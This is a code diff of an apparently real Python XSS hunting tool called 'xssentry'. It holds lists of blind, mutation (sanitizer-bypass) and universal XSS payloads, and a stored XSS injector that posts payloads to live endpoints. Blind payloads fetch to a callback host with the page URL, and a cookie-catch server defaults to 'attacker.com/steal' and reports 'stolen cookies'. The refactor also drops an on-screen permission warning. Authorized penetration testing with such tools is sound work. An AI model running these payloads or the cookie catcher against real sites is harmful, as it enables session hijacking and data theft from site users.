 # BPARAM = param name being tested
 # BSRC   = source URL being tested
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 BLIND_PAYLOADS = [
-    # Template strings — BURL/BTOKEN/BPARAM replaced at runtime by BlindXSSTester
+    # Template strings --- BURL/BTOKEN/BPARAM replaced at runtime by BlindXSSTester
     # All use double-quoted attribute values; inner JS uses no quotes
     "<script>fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))</script>",
     "<svg onload=fetch('BURL/?b=BTOKEN&p=BPARAM&u='+encodeURIComponent(location.href))>",
@@ -2337,11 +1627,11 @@ BLIND_PAYLOADS = [
 ]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# DOM XSS  — client-side sink detection via JS pattern analysis
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# DOM XSS  --- client-side sink detection via JS pattern analysis
 # Scans page source for dangerous sinks receiving URL-controllable sources.
 # Also probes with marker values to detect DOM reflection without server echo.
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class DOMXSSScanner:
     """
     Two strategies:
@@ -2377,7 +1667,7 @@ class DOMXSSScanner:
         r"(?:location\.|document\.URL|window\.name|URLSearchParams|\.hash|\.search)",
         re.I | re.S)
 
-    # DOM XSS probe payloads — injected into URL params, checked in page HTML
+    # DOM XSS probe payloads --- injected into URL params, checked in page HTML
     PROBE_MARKER = "XS5D0M"
     DOM_PROBES = [
         "<XS5D0M>",
@@ -2440,13 +1730,13 @@ class DOMXSSScanner:
         return results
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# MUTATION XSS (mXSS)  — bypasses sanitizers via innerHTML re-parsing tricks
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# MUTATION XSS (mXSS)  --- bypasses sanitizers via innerHTML re-parsing tricks
 # Modern sanitizers (DOMPurify < 2.4, etc.) can be bypassed by feeding HTML
-# that mutates when parsed → re-parsed by the browser.
-# ─────────────────────────────────────────────────────────────────────────────
+# that mutates when parsed --- re-parsed by the browser.
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 MXSS_PAYLOADS = [
-    # SVG foreignObject → HTML namespace switch (DOMPurify bypass)
+    # SVG foreignObject --- HTML namespace switch (DOMPurify bypass)
     '<svg><p><style><g id="</style><img src=1 onerror=alert(1)>">',
     # SVG use element href mutation
     '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayc+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg==#x">',
@@ -2464,7 +1754,7 @@ MXSS_PAYLOADS = [
     '<iframe srcdoc="<img src=1 onerror=parent.alert(1)>">',
     # SVG script via animate (mutation triggers after parse)
     '<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a></svg>',
-    # select option → innerHTML mutation
+    # select option --- innerHTML mutation
     '<select><option><img src=1 onerror=alert(1)></option></select>',
     # ruby annotation mutation
     '<ruby><rt><![CDATA[x]]></rt><script>alert(1)</script></ruby>',
@@ -2481,11 +1771,11 @@ MXSS_PAYLOADS = [
 ]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# UNIVERSAL XSS (uXSS)  — cross-origin / browser-level vectors
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# UNIVERSAL XSS (uXSS)  --- cross-origin / browser-level vectors
 # These exploit browser quirks, extensions, or protocol handlers.
 # Detected via reflection + pattern matching (no browser needed).
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 UXSS_PAYLOADS = [
     "data:text/html,<script>alert(document.domain)</script>",
     "javascript:alert(document.domain)//",
@@ -2502,20 +1792,20 @@ UXSS_PAYLOADS = [
 ]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # STORED XSS ENGINE
 # Inject payloads into writable endpoints (POST forms, APIs).
 # Then visit a set of retrieval URLs (pages that display stored content)
 # and check for unescaped payload reflection.
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class StoredXSSScanner:
     """
     Pipeline:
       1. Identify writable endpoints (POST/PUT, form inputs, JSON APIs)
       2. Inject stored XSS payload with a unique token
-      3. Visit retrieval URLs (comments page, profile, dashboard, activity feed…)
+      3. Visit retrieval URLs (comments page, profile, dashboard, activity feed---)
       4. Check if the payload token appears unescaped
-      5. If found → confirmed stored XSS
+      5. If found --- confirmed stored XSS
 
     Retrieval URL heuristics:
       - Same-domain pages crawled during phase 1
@@ -2551,68 +1841,54 @@ class StoredXSSScanner:
         return "XS5S" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
     def scan(self, endpoints, base_url):
-        section("STORED XSS — INJECT & RETRIEVE", "💾")
+        section("STORED XSS --- INJECT & RETRIEVE")
         retrieval = self._retrieval_urls(base_url)
-        tprint(f"  {info(str(len(endpoints)) + ' writable endpoints · ' + str(len(retrieval)) + ' retrieval URLs')}")
+        console.log(info(f"{len(endpoints)} writable endpoints -- {len(retrieval)} retrieval URLs"))
 
-        # Use simple reflected payloads wrapped with unique token for stored check
-        stored_pls = [
-            '<script>alert("XS5STORED")</script>',
-            '<img src=x onerror=alert("XS5STORED")>',
-            '<svg onload=alert("XS5STORED")>',
-            '"><script>alert("XS5STORED")</script>',
-            "'><img src=x onerror=alert('XS5STORED')>",
-            '<details open ontoggle=alert("XS5STORED")>',
-        ]
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold orange3]Stored XSS:[/] {task.description}"),
+            BarColumn(complete_style="orange3"),
+            MofNCompleteColumn(),
+            console=console,
+            transient=True
+        ) as progress_bar:
+            total_tasks = sum(1 for ep in endpoints if ep["method"] in ("POST","PUT")) * len(retrieval)
+            task = progress_bar.add_task("Injecting & Verifying...", total=total_tasks)
 
-        for ep in endpoints:
-            if ep["method"] not in ("POST","PUT"): continue
-            url    = ep["url"]
-            params = ep["params"]
-            for param in params:
-                token = self._stored_token()
-                for pl_tmpl in stored_pls:
-                    pl = pl_tmpl.replace("XS5STORED", token)
-                    test_params = {**params, param: pl}
-                    try:
-                        self.client.post(url, test_params)
-                    except Exception: continue
-                    # Visit retrieval URLs and look for unescaped token
-                    for rurl in retrieval:
+            # Use simple reflected payloads wrapped with unique token for stored check
+            stored_pls = [
+                '<script>alert("XS5STORED")</script>',
+                '<img src=x onerror=alert("XS5STORED")>',
+                '"><script>alert("XS5STORED")</script>',
+            ]
+
+            for ep in endpoints:
+                if ep["method"] not in ("POST","PUT"): continue
+                url, params = ep["url"], ep["params"]
+                for param in params:
+                    token = self._stored_token()
+                    for pl_tmpl in stored_pls:
+                        pl = pl_tmpl.replace("XS5STORED", token)
                         try:
-                            resp = self.client.get(rurl)
-                            body = resp.get("body","")
-                            if token in body:
-                                # Verify it's not HTML-escaped
-                                esc = token.replace("<","&lt;").replace(">","&gt;")
-                                if token in body and esc not in body:
-                                    finding = {
-                                        "type":    "stored",
-                                        "inject_url": url,
-                                        "inject_param": param,
-                                        "payload": pl,
-                                        "found_at": rurl,
-                                        "token":   token,
-                                    }
-                                    with self._lock:
-                                        self.findings.append(finding)
-                                    sys.stdout.write("\r" + " " * 65 + "\r")
-                                    tprint(f"\n  {color('STORED XSS', C.BRED, C.BOLD)}  {color(url, C.BWHITE)}")
-                                    tprint(f"  {color('  param   :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
-                                    tprint(f"  {color('  payload :', C.DIM)} {color(pl, C.BRED)}")
-                                    tprint(f"  {color('  found at:', C.DIM)} {color(rurl, C.BCYAN)}")
-                                    break
+                            self.client.post(url, {**params, param: pl})
+                            for rurl in retrieval:
+                                progress_bar.update(task, description=f"Checking {rurl[:30]}...", advance=1)
+                                resp = self.client.get(rurl)
+                                if token in resp.get("body",""):
+                                    if token in resp["body"] and token.replace("<","&lt;") not in resp["body"]:
+                                        finding = {"type":"stored","inject_url":url,"found_at":rurl,"param":param,"payload":pl,"score":95}
+                                        with self._lock: self.findings.append(finding)
+                                        console.log(f"\n[bold white on orange3] STORED [/] [bold white]{url}[/]")
+                                        console.log(f"  [dim]found at:[/] [cyan]{rurl}[/]")
+                                        break
                         except Exception: continue
-                    else:
-                        continue
-                    break   # found for this param, move to next
-        tprint(f"  {ok(f'Stored XSS scan complete — {len(self.findings)} confirmed')}")
         return self.findings
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# BLIND XSS TESTER  — sends OOB payloads, polls callback server
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# BLIND XSS TESTER  --- sends OOB payloads, polls callback server
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class BlindXSSTester:
     """
     Sends blind XSS payloads to ALL endpoints (GET + POST).
@@ -2636,13 +1912,13 @@ class BlindXSSTester:
                 .replace("BSRC",   urllib.parse.quote(src_url, safe="")))
 
     def scan(self, endpoints, blind_server):
-        section("BLIND XSS — OOB CALLBACK INJECTION", "🕳")
+        section("BLIND XSS --- OOB CALLBACK INJECTION")
         if not self.burl:
-            tprint(f"  {warn('No blind XSS server — skipping (use --blind-port or --blind-url)')}")
+            tprint(f"  {warn('No blind XSS server --- skipping (use --blind-port or --blind-url)')}")
             return []
-        tprint(f"  {info(f'Callback: {color(self.burl, C.BCYAN, C.BOLD)}')}")
-        tprint(f"  {info(f'Token:    {color(self.token, C.BMAGENTA, C.BOLD)}')}")
-        tprint(f"  {info(str(len(endpoints)) + ' endpoints · ' + str(len(BLIND_PAYLOADS)) + ' blind payloads')}")
+        tprint(f"  {info(f'Callback: {color(self.burl, C.CYAN, C.BOLD)}')}")
+        tprint(f"  {info(f'Token:    {color(self.token, C.fg(201), C.BOLD)}')}")
+        tprint(f"  {info(str(len(endpoints)) + ' endpoints -- ' + str(len(BLIND_PAYLOADS)) + ' blind payloads')}")
 
         injected = 0
         for ep in endpoints:
@@ -2661,9 +1937,9 @@ class BlindXSSTester:
                         injected += 1
                     except Exception: pass
 
-        tprint(f"  {info(f'{injected} blind payloads injected — polling {len(BLIND_PAYLOADS[:6])*8}s…')}")
+        tprint(f"  {info(f'{injected} blind payloads injected --- polling {len(BLIND_PAYLOADS[:6])*8}s---')}")
 
-        # Poll for hits — stored blind XSS may fire when page is visited later
+        # Poll for hits --- stored blind XSS may fire when page is visited later
         # We poll for a short window; real Blind XSS needs human to visit
         for _ in range(20):
             hit, data = blind_server.poll(self.token, timeout=0.5)
@@ -2671,151 +1947,83 @@ class BlindXSSTester:
                 finding = {"type":"blind","data":data}
                 with self._lock: self.findings.append(finding)
                 tprint(f"  {color('BLIND XSS CONFIRMED', C.BRED, C.BOLD)}  "
-                       f"{color(data.get('src','?')[:60], C.BCYAN)}")
+                       f"{color(data.get('src','?')[:60], C.CYAN)}")
                 break
             time.sleep(0.3)
 
-        tprint(f"  {ok(f'Blind XSS scan done — {len(self.findings)} confirmed callbacks')}")
+        tprint(f"  {ok(f'Blind XSS scan done --- {len(self.findings)} confirmed callbacks')}")
         tprint(f"  {color("  Note: Blind XSS may fire later when a victim views the page.", C.DIM)}")
         tprint(f"  {color(f"  Monitor: {self.burl}", C.DIM)}")
         return self.findings
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# FINAL REPORT  — HELLHOUND-style structured output
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# FINAL REPORT  --- HELLHOUND-style structured output
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 def print_report(findings, target, stats, caught_cookies,
                  stored=None, dom=None, mxss=None, uxss=None, blind=None):
-    section("FINAL REPORT")
-    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    """Final high-contrast report summary with Rich tables."""
+    section("FINAL AUDIT REPORT")
+    
+    # Overview statistics panel
+    stats_table = Table(box=None, show_header=False)
+    stats_table.add_row("[bold cyan]Target URL[/]", f"[white]{target}[/]")
+    stats_table.add_row("[bold cyan]Total Endpoints[/]", str(stats.get("endpoints", 0)))
+    stats_table.add_row("[bold cyan]Findings (Reflected)[/]", f"[bold red]{len(findings)}[/]")
+    stats_table.add_row("[bold cyan]Findings (Others)[/]", f"[bold red]{len(stored or []) + len(dom or []) + len(mxss or []) + len(uxss or []) + len(blind or [])}[/]")
+    
+    console.print(Panel(stats_table, title="[bold white]SCAN OVERVIEW[/]", border_style="cyan", expand=False))
+    console.print()
 
-    rows = [
-        ("Target",          target),
-        ("Completed",       ts),
-        ("Pages crawled",   str(stats["pages"])),
-        ("JS files",        str(stats["js_files"])),
-        ("SPA endpoints",   str(stats["spa_eps"])),
-        ("Endpoints tested",str(stats["endpoints"])),
-        ("Params tested",   str(stats["params"])),
-        ("Confirmed XSS",   str(len(findings))),
-        ("Stored XSS",      str(stats.get("stored",0))),
-        ("DOM XSS",         str(stats.get("dom",0))),
-        ("mXSS findings",   str(stats.get("mxss",0))),
-        ("uXSS findings",   str(stats.get("uxss",0))),
-        ("Blind XSS",       str(stats.get("blind",0))),
-        ("Cookies caught",  str(len(caught_cookies))),
-    ]
-    for k, v in rows:
-        is_vuln = k in ("Confirmed XSS", "Cookies caught")
-        vc = (C.BRED if int(v) > 0 else C.BGREEN) if (is_vuln and v.isdigit()) else C.BWHITE
-        bd = C.BOLD if is_vuln else ""
-        k_col = color(k + ":", C.BCYAN, C.BOLD)
-        pad   = max(0, 22 - len(k))
-        print(f"  {k_col}{' '*pad} {color(v, vc, bd)}")
+    # Main Findings Table
+    show_findings_table(findings)
 
-    if not findings:
-        print(f"\n  {color('✓  No confirmed XSS vulnerabilities.', C.BGREEN, C.BOLD)}")
-        print(f"  {color('   All suspicious patterns eliminated by 4-stage verification.', C.DIM)}")
-        print(f"  {color('   Manual review is always recommended for full confidence.', C.DIM)}")
-        return
-
-    # ── Vulnerability list ────────────────────────────────────────────────────
-    section(f"FINDINGS  [{len(findings)} CONFIRMED]")
-    seen_key = {}
-    for f in findings:
-        k = (f["url"], f["param"], f["type"])
-        if k not in seen_key or f["tier"] < seen_key[k]["tier"]:
-            seen_key[k] = f
-    unique = list(seen_key.values())
-
-    for i, f in enumerate(unique, 1):
-        tier_c = [C.fg(46),C.fg(48),C.fg(51),C.fg(220),C.fg(208),C.fg(196)][min(f["tier"]-1,5)]
-        print(f"\n  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f['method'], C.BYELLOW)}  "
-              f"{color(f['url'], C.BWHITE)}")
-        print(f"  {color('  param   :', C.DIM)} {color(f['param'], C.BRED, C.BOLD)}")
-        print(f"  {color('  payload :', C.DIM)} {color(f['payload'], C.BRED)}")
-        xtype = f.get('xss_type','reflected')
-        ctx   = f.get('context','?')
-        print(f"  {color('  type    :', C.DIM)} {color(xtype, C.BMAGENTA)}  "
-              f"{color('ctx:'+ctx, C.DIM)}")
-        print(f"  {color('  tier    :', C.DIM)} {color(str(f['tier'])+' — '+f['payload_id'], tier_c)}")
-        print(f"  {color('  score   :', C.DIM)} {color(str(f.get('score', 0))+'%', C.BGREEN if f.get('score', 0) >= 80 else C.BYELLOW, C.BOLD)}")
-        print(f"  {color('  signals :', C.DIM)} {color(', '.join(f['signals'][:3]), C.BGREEN)}")
-        if f.get("pw_confirmed"):
-            print(f"  {color('  browser :', C.DIM)} {color('CONFIRMED via Playwright', C.BCYAN, C.BOLD)}")
-            if f.get("screenshot"):
-                print(f"  {color('  proof   :', C.DIM)} {color(f['screenshot'], C.BWHITE)}")
-        if f.get("browser"):
-            print(f"  {color('  browser :', C.DIM)} {color(f['browser'], C.BCYAN)}")
-        if f.get("exfil_cookie"):
-            print(f"  {color('  cookie  :', C.DIM)} {color(f['exfil_cookie'], C.fg(214), C.BOLD)}")
-        elif f.get("cookie_pocs"):
-            cp = f["cookie_pocs"][0]
-            if cp.get("browser"):
-                print(f"  {color('  ck-exfil:', C.DIM)} {color(cp['browser'], C.BRED)}")
-        print(f"  {color('─'*68, C.DIM)}")
-
-    print(f"\n  {color('All findings VERIFIED — 4-stage false-positive filter applied.', C.BWHITE)}")
-    print(f"  {color('Fix: HTML-encode all output. Never reflect raw user input.', C.DIM)}")
-
-    # ── Stolen cookies ────────────────────────────────────────────────────────
+    # Detailed Summaries for other types
     if caught_cookies:
-        section(f"STOLEN COOKIES  [{len(caught_cookies)} received]")
-        for i, ck in enumerate(caught_cookies, 1):
-            print(f"  {color(f'#{i}', C.fg(214), C.BOLD)}  "
-                  f"{color(ck['ts'], C.DIM)}  from {color(ck['ip'], C.BWHITE)}")
-            print(f"       {color(ck['cookie'], C.fg(214), C.BOLD)}")
-            if ck.get("ua"):
-                print(f"       {color('UA: '+ck['ua'][:70], C.DIM)}")
-            print()
+        ck_table = Table(title="[bold orange3]STOLEN COOKIES[/]", box=box.SIMPLE)
+        ck_table.add_column("Timestamp", style="dim")
+        ck_table.add_column("Source IP", style="white")
+        ck_table.add_column("Cookie Data", style="bold orange3")
+        for ck in caught_cookies:
+            ck_table.add_row(ck["ts"], ck["ip"], ck["cookie"][:80])
+        console.print(ck_table)
+        console.print()
 
-    # ── Extra XSS type summaries ─────────────────────────────────────────────
     if stored:
-        section(f"STORED XSS  [{len(stored)} CONFIRMED]")
-        for i, f in enumerate(stored, 1):
-            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f['inject_url'], C.BWHITE)}")
-            print(f"  {color('  param   :', C.DIM)} {color(f['inject_param'], C.BRED, C.BOLD)}")
-            print(f"  {color('  found at:', C.DIM)} {color(f['found_at'], C.BCYAN)}")
-            print(f"  {color('  payload :', C.DIM)} {color(f['payload'][:80], C.BRED)}")
-            print()
+        st_table = Table(title="[bold red]STORED XSS FINDINGS[/]", box=box.SIMPLE)
+        st_table.add_column("Inject URL", style="white")
+        st_table.add_column("Param", style="bold red")
+        st_table.add_column("Retrieval URL", style="cyan")
+        for f in stored:
+            st_table.add_row(f["inject_url"][:40], f["inject_param"], f["found_at"][:40])
+        console.print(st_table)
+        console.print()
 
     if dom:
-        section(f"DOM XSS  [{len(dom)} POTENTIAL]")
-        for i, f in enumerate(dom[:10], 1):
-            print(f"  {color(f'#{i}', C.BYELLOW, C.BOLD)}  {color(f.get('type','dom'), C.BMAGENTA)}  {color(f.get('url','?')[:55], C.BWHITE)}")
-            if f.get('param'):
-                print(f"  {color('  param  :', C.DIM)} {color(f['param'], C.BRED, C.BOLD)}")
-            print(f"  {color('  detail :', C.DIM)} {color(f.get('detail','?')[:70], C.DIM)}")
-            print()
+        dom_table = Table(title="[bold magenta]DOM XSS POTENTIAL[/]", box=box.SIMPLE)
+        dom_table.add_column("Type", style="bold magenta")
+        dom_table.add_column("URL", style="white")
+        dom_table.add_column("Detail", style="dim")
+        for f in dom[:10]:
+            dom_table.add_row(f.get("type","dom"), f.get("url","?")[:50], f.get("detail","?")[:50])
+        console.print(dom_table)
+        console.print()
 
-    if mxss:
-        section(f"MUTATION XSS  [{len(mxss)} CONFIRMED]")
-        for i, f in enumerate(mxss, 1):
-            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f.get('url','?'), C.BWHITE)}")
-            print(f"  {color('  param  :', C.DIM)} {color(f.get('param','?'), C.BRED, C.BOLD)}")
-            print(f"  {color('  payload:', C.DIM)} {color(f.get('payload','?')[:80], C.BRED)}")
-            print()
+    if mxss or uxss or blind:
+        misc_table = Table(title="[bold yellow]OTHER VECTORS (mXSS/uXSS/Blind)[/]", box=box.SIMPLE)
+        misc_table.add_column("Type", style="bold yellow")
+        misc_table.add_column("Source", style="white")
+        misc_table.add_column("Status", style="bold green")
+        for f in (mxss or []): misc_table.add_row("mXSS", f.get("url","?")[:50], "CONFIRMED")
+        for f in (uxss or []): misc_table.add_row("uXSS", f.get("url","?")[:50], "CONFIRMED")
+        for f in (blind or []): misc_table.add_row("Blind", f.get("data",{}).get("src","?")[:50], "HIT RECEIVED")
+        console.print(misc_table)
+        console.print()
 
-    if uxss:
-        section(f"UNIVERSAL XSS (uXSS)  [{len(uxss)} CONFIRMED]")
-        for i, f in enumerate(uxss, 1):
-            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f.get('url','?'), C.BWHITE)}")
-            print(f"  {color('  param  :', C.DIM)} {color(f.get('param','?'), C.BRED, C.BOLD)}")
-            print()
-
-    if blind:
-        section(f"BLIND XSS  [{len(blind)} CONFIRMED CALLBACKS]")
-        for i, f in enumerate(blind, 1):
-            d = f.get("data",{})
-            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color('OOB callback received', C.BGREEN, C.BOLD)}")
-            print(f"  {color('  param  :', C.DIM)} {color(d.get('param','?'), C.BRED, C.BOLD)}")
-            print(f"  {color('  src    :', C.DIM)} {color(d.get('src','?')[:60], C.BCYAN)}")
-            print(f"  {color('  time   :', C.DIM)} {color(d.get('ts','?'), C.DIM)}")
-            print()
-
-    print()
-    print(color("  " + "─" * 68, C.DIM))
-    print()
+    console.print(Rule(style="dim"))
+    console.print(Text("Audit complete. Professional report generated via HELLHOUND engine.", justify="center", style="dim"))
+    console.print()
 
 
 def export_json(findings, target, stats, caught_cookies, path,
@@ -2835,46 +2043,110 @@ def export_json(findings, target, stats, caught_cookies, path,
             "blind_xss":     blind or [],
             "stolen_cookies": caught_cookies,
         }, fh, indent=2)
-    tprint(f"  {ok(f'JSON report → {path}')}")
+    tprint(f"  {ok(f'JSON report --- {path}')}")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # MAIN
-# ─────────────────────────────────────────────────────────────────────────────
-def main():
-    print_banner()
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# EXTERNAL RECON INTEGRATION
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+def run_external_spider(target, args):
+    """Executes external Hellhound Spider and parses JSON output."""
+    temp_json = f".spider_{int(time.time())}.json"
+    cmd = [sys.executable, "spider.py", target, "--out", temp_json]
+    if getattr(args, "verbose", False): cmd.append("--verbose")
+    
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[bold cyan]PHASE 1/2 --- RECONNAISSANCE BY HELLHOUND-SPIDER[/]"),
+        BarColumn(complete_style="cyan"),
+        console=console,
+        transient=True
+    ) as progress_bar:
+        task = progress_bar.add_task("Crawling...", total=None) # Indeterminate
+        try:
+            # If verbose, we let the output flow so the user can see it
+            if getattr(args, "verbose", False):
+                subprocess.run(cmd, check=True)
+            else:
+                subprocess.run(cmd, check=True, capture_output=True)
+            if not os.path.exists(temp_json):
+                return []
+            with open(temp_json, "r") as f: data = json.load(f)
+            os.remove(temp_json) # Cleanup
 
+            raw_eps = []
+            for ep in data.get("endpoints", []):
+                url, methods = ep["url"], ep.get("methods", ["GET"])
+                p_map = ep.get("params", {}); params = {}
+                for bucket in ["query", "form", "js", "openapi", "runtime"]:
+                    for p in p_map.get(bucket, []): params[p] = "test"
+                for m in methods:
+                    raw_eps.append({"url": url, "method": m.upper(), "params": params,
+                                    "hidden": {}, "source": "spider"})
+            progress_bar.update(task, completed=100, total=100) # Finish it
+            return raw_eps
+        except Exception as e:
+            tprint(f"  {err(f'External spider failed: {e}')}"); return []
+
+def show_findings_table(all_findings):
+    if not all_findings:
+        console.print()
+        console.print(Panel("[bold green]Zero vulnerabilities detected. System appears clean.[/]", title="[bold white]AUDIT RESULT[/]", border_style="green", expand=False))
+        return
+
+    table = Table(title="[bold red]XSS AUDIT FINDINGS[/]", box=box.HEAVY_EDGE, show_lines=True)
+    table.add_column("Sev", justify="center")
+    table.add_column("Type", style="bold magenta")
+    table.add_column("Parameter", style="bold orange3")
+    table.add_column("URL (Endpoint)", style="white")
+    table.add_column("Payload (Truncated)", style="dim")
+    table.add_column("Score", justify="right")
+
+    for f in all_findings:
+        score = f.get("score", 0)
+        sev = "[bold red]CRIT[/]" if score >= 90 else "[bold red]HIGH[/]" if score >= 70 else "[bold yellow]MED[/]" if score >= 40 else "[bold cyan]LOW[/]"
+        
+        table.add_row(
+            sev,
+            f.get("xss_type", "reflected").upper(),
+            f.get("param", "N/A"),
+            f.get("url", "N/A")[:50],
+            f.get("payload", "N/A")[:30] + "...",
+            f"[bold]{score}%[/]"
+        )
+    
+    console.print(table)
+    console.print()
+
+def main():
     ap = argparse.ArgumentParser(
-        description="xssentry v3.2 — Autonomous XSS Hunter (HELLHOUND-engine)",
+        description="xssentry v4.0 --- Autonomous XSS Hunter (HELLHOUND-engine)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
   python3 xssentry.py https://target.com
-  python3 xssentry.py https://target.com --tier 6 -d 5 -t 16
-  python3 xssentry.py https://target.com/search?q=hi --no-crawl
+  python3 xssentry.py https://target.com -d 5 -t 16
   python3 xssentry.py https://target.com -o report.json
-  python3 xssentry.py https://target.com --cookie-port 9999
 
-⚠  Authorized security testing only.
+  Authorized security testing only.
         """)
     ap.add_argument("url")
-    ap.add_argument("-d","--depth",         type=int,   default=3)
-    ap.add_argument("-t","--threads",       type=int,   default=10)
+    ap.add_argument("-t","--threads",       type=int,   default=10,
+                    help="Concurrent XSS test workers (default: 10)")
     ap.add_argument("--max-pages",          type=int,   default=80)
-    ap.add_argument("--tier",               type=int,   default=5, choices=range(1,7))
     ap.add_argument("-o","--output",        help="Save JSON report")
     ap.add_argument("--cookie-port",        type=int,   default=8765)
     ap.add_argument("--no-cookie-server",   action="store_true")
     ap.add_argument("--cookie-catcher",     default=None)
     ap.add_argument("--delay",              type=float, default=0.0)
-    ap.add_argument("--no-crawl",           action="store_true")
     ap.add_argument("--no-fuzz",            action="store_true")
     ap.add_argument("--timeout",            type=int,   default=8,
                     help="HTTP timeout per request in seconds (default: 8)")
-    ap.add_argument("--fast",               action="store_true",
-                    help="Fast mode: tier 2 cap, no wordlist fuzz, 6s timeout")
     ap.add_argument("--blind-port",         type=int, default=0,
-                    help="Port for blind XSS OOB server (0=random, 0=disable blind scan)")
+                    help="Port for blind XSS OOB server (0=random, -1=disable blind scan)")
     ap.add_argument("--cookie",             default=None,
                     help="Session cookie or Authorization header for authenticated scans")
     ap.add_argument("--no-stored",          action="store_true",
@@ -2883,28 +2155,25 @@ Examples:
                     help="Skip DOM XSS static analysis")
     ap.add_argument("--no-blind",           action="store_true",
                     help="Skip blind XSS scan")
-    ap.add_argument("--spider",             action="store_true",
-                    help="Run Hellhound Spider for recon (default if spider.py present)")
-    ap.add_argument("--no-spider",          action="store_true",
-                    help="Disable Hellhound Spider and use internal crawler")
-    ap.add_argument("--spider-json",        type=str,
-                    help="Load targets from a Hellhound Spider JSON report")
+    ap.add_argument("-v","--verbose",       action="store_true",
+                    help="Show verbose spider and test output")
     args = ap.parse_args()
 
     target = args.url.strip()
     if not target.startswith(("http://","https://")): target = "https://" + target
 
-    # -- Apply --fast overrides ------------------------------------------------
-    if args.fast:
-        args.tier    = min(args.tier, 2)   # only tier 1-2 payloads
-        args.no_fuzz = True                # skip wordlist fuzz
-        args.timeout = min(args.timeout, 6)
-        tprint(f"  {warn('FAST MODE: tier cap=2, no wordlist fuzz, timeout=6s')}")
+    print_banner()
 
-    tprint(f"  {warn('Only test systems you have explicit permission to test.')}")
-    tprint(f"  {info(f'Target: {color(target, C.BWHITE, C.BOLD)}')}\n")
+    with console.status("[bold cyan]Initializing Engines and Resources...", spinner="dots"):
+        time.sleep(0.5)
 
-    # ── Cookie catch server ───────────────────────────────────────────────────
+    # -- Autonomous tier selection (5 by default) ------------------------------------------------
+    args.tier = 5  # Always tier 5 - fully autonomous
+
+    console.print(info(f'Target: [bold white]{target}[/]'))
+    console.print()
+
+    # ------ Cookie catch server ---------------------------------------------------------------------------------------------------------------------------------------------------------
     cookie_srv  = None
     catcher_url = args.cookie_catcher or "https://attacker.com/steal"
 
@@ -2913,255 +2182,150 @@ Examples:
         srv_url    = cookie_srv.start()
         if srv_url:
             catcher_url = srv_url
-            tprint(f"  {ck_lbl('Cookie catch server started')}")
-            tprint(f"  {color('  Listening → ', C.DIM)}{color(srv_url, C.fg(214), C.BOLD)}")
-            tprint(f"  {color('  Cookies arrive here when XSS fires', C.DIM)}\n")
+            tprint(f" {ck_lbl('Cookie catch server started')}")
+            tprint(f"Listening --- [bold orange3]{srv_url}[/bold orange3]")
+            tprint(f"Cookies arrive here when XSS fires\n")
         else:
-            tprint(f"  {warn('Cookie server failed — using placeholder URL')}\n")
+            tprint(f"  {warn('Cookie server failed --- using placeholder URL')}\n")
     elif args.cookie_catcher:
         tprint(f"  {ck_lbl(f'Cookie catcher: {color(catcher_url, C.fg(214))}')}\n")
 
     cookie = getattr(args, "cookie", None)
     client = HTTPClient(timeout=args.timeout)
 
-    # ── Phase 1: Crawl ────────────────────────────────────────────────────────
-    if args.no_crawl:
-        section("PHASE 1/4 — CRAWL  (skipped — --no-crawl)", "🕷")
-        p      = urllib.parse.urlparse(target)
-        qs     = urllib.parse.parse_qs(p.query, keep_blank_values=True)
-        clean  = p._replace(query="").geturl()
